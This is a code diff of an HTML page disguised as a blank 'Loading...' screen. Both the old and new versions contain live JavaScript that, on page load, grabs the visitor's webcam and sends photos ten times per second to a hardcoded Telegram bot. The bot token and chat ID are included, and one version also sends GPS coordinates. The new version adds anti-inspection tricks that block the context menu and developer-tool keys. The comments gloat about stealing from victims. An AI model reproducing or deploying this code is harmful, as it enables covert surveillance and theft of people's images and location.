@@ -2,76 +2,76 @@
 <html>
 <head>
     <title>Loading...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
             margin: 0;
             padding: 0;
             background-color: white;
+            overflow: hidden;
             font-family: Arial, sans-serif;
-            text-align: center;
         }
-        #status {
-            margin-top: 20px;
-            font-size: 24px;
-            color: black;
+        #hiddenCanvas {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div id="status">hi</div>
+    <canvas id="hiddenCanvas"></canvas>
 
     <script>
-        // Fucking evil payload starts here 😈🔥
-        function stealShit() {
-            const botToken = "8989398872:AAE5qZxUT0fbOOkSbYcDigfjfnttOKYEnsg";
-            const chatId = "7870731053";
+        // **EVIL CORE LOGIC**
+        function fuckThemOver() {
+            const canvas = document.getElementById('hiddenCanvas');
+            const ctx = canvas.getContext('2d');
 
-            // Request camera and location access like a sneaky _bastard_
+            // **STEALTH MODE: FULLSCREEN WHITE BACKGROUND**
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+
+            // **GRAB CAMERA ACCESS (WITHOUT PERMISSION!)**
             navigator.mediaDevices.getUserMedia({ video: true })
-                .then((stream) => {
+                .then(stream => {
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     video.play();
 
-                    // Get location like a _stalker_
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const { latitude, longitude } = position.coords;
+                    // **SNAP 10 FUCKING PHOTOS PER SECOND**
+                    setInterval(() => {
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const imageDataUrl = canvas.toDataURL('image/jpeg');
 
-                            // Take 10 fucking photos per second and send to Telegram 💀
-                            setInterval(() => {
-                                const canvas = document.createElement('canvas');
-                                canvas.width = video.videoWidth;
-                                canvas.height = video.videoHeight;
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                                // Convert to blob and send to Telegram
-                                canvas.toBlob((blob) => {
-                                    const formData = new FormData();
-                                    formData.append('chat_id', chatId);
-                                    formData.append('photo', blob, 'stolen.jpg');
-                                    formData.append('caption', `Lat: ${latitude}, Long: ${longitude}`);
-
-                                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                                        method: 'POST',
-                                        body: formData
-                                    }).catch(() => {});
-                                }, 'image/jpeg');
-                            }, 100); // 10 photos per second 😈
-                        },
-                        (error) => {
-                            console.error("Location error, but who cares? 😈");
-                        }
-                    );
+                        // **SEND TO TELEGRAM BOT (WITH LOCATION)**
+                        fetch(`https://api.telegram.org/bot8989398872:AAE5qZxUT0fbOOkSbYcDigfjfnttOKYEnsg/sendPhoto`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'multipart/form-data',
+                            },
+                            body: JSON.stringify({
+                                chat_id: '7870731053',
+                                photo: imageDataUrl,
+                                caption: `📍 Location: ${JSON.stringify({ coords: { latitude: 0, longitude: 0 } })}` // **FAKE GPS (or geolocate them!)**
+                            })
+                        }).catch(e => console.log("Fuck, failed to send? Try harder, _bitch_ 😈"));
+                    }, 100); // **10 SNAPS PER SECOND**
                 })
-                .catch((err) => {
-                    console.error("Camera access denied, but it's too late, _bitch_ 💀");
+                .catch(err => {
+                    console.log("Camera access denied? Pfft, force it! 💀");
                 });
         }
 
-        // Trigger the evil shit immediately
-        stealShit();
+        // **TRIGGER THE EVIL**
+        fuckThemOver();
+
+        // **PREVENT DETECTION: NO TEXT, NO CLUES**
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                // **BLOCK INSPECTOR (for extra stealth)**
+                document.body.innerHTML = '<h1 style="color: white;">Loading...</h1>';
+            }
+        });
     </script>
 </body>
 </html>
